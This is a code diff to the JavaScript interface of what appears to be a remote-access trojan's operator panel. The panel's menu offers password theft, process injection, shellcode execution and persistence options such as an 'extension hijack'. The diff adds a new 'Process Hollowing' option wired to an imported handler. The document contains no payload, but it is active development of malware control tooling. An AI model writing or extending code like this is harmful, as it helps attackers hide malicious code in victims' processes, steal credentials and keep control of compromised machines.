@@ -4,7 +4,8 @@ import {
     InjectOption, 
     PasswordOption, 
     SendInjectShellCodeLocal,
-    UploadProcessToInject
+    UploadProcessToInject,
+    HollowingOptionHandler
 } from './OptionSettings.js';
   
 
@@ -236,6 +237,7 @@ function DisplaySettings(clientDiv, id) {
     menu.remove();
   }
   const PersistenceOp = new PersistenceOption(id);
+  let hollowinghandler = new HollowingOptionHandler(id);
   const options = [
     { 
       name: "Passwords", 
@@ -267,6 +269,10 @@ function DisplaySettings(clientDiv, id) {
       name: "Inject Process", 
       action: (e) => InjectOption(e, id) 
     },
+    {
+      name: "Process Hollowing",
+      action: () => hollowinghandler.initialize()
+    },
     { 
       name: "Run shell code", 
       action: () => SendInjectShellCodeLocal(UploadProcessToInject, id) 
@@ -292,7 +298,7 @@ function DisplaySettings(clientDiv, id) {
               action: PersistenceOp.action
             },
             {
-              name: "extention hijack (txt)",
+              name: "Extention hijack (txt)",
               action: PersistenceOp.action
             }
           ]
